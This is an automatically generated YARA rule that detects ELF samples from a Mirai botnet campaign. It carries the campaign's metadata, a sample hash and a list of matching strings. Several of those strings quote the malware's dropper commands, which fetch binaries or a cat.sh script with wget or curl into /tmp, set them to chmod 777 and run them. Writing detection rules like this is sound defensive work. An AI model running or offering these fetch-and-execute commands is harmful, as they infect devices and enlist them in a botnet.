rule Sightlines_c2_ddaf44fb_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-ddaf44fb"
        date = "2026-10-28"
        campaign = "c2-ddaf44fb"
        family = "mirai"
        hash = "088f7e3da839bfee33ea19a4bdcd940603ef7cfde33c5e116444931a048cc094"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-ddaf44fb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel realtek; wget http://%s" ascii
        $s1 = " /tmp; wget http://%s/mipsel; chmod 777 mipsel; ./mipsel netis.netcore; wget http://%s/armv4l; chmod" ascii
        $s2 = "cd /tmp || cd /dev wget http://%s/cat.sh; curl -O http://%s/cat.sh; chmod 777 cat.sh; sh cat.sh; " ascii
        $s3 = "/armv4l; chmod 777 armv4l; ./armv4l realtek; " ascii
        $s4 = " 777 armv4l; ./armv4l netis.netcore; " ascii
        $s5 = "/usr/sbin/NetworkManager" ascii
        $s6 = "Connection: keep-alive" ascii
        $s7 = "[0mNo shell available" ascii
        $s8 = "/usr/sbin/dbus-daemon" ascii
        $s9 = "/bin/busybox ftpget" ascii
        $s10 = "[0mAccess granted!" ascii
        $s11 = "[0mWrong password!" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 9 of them
}
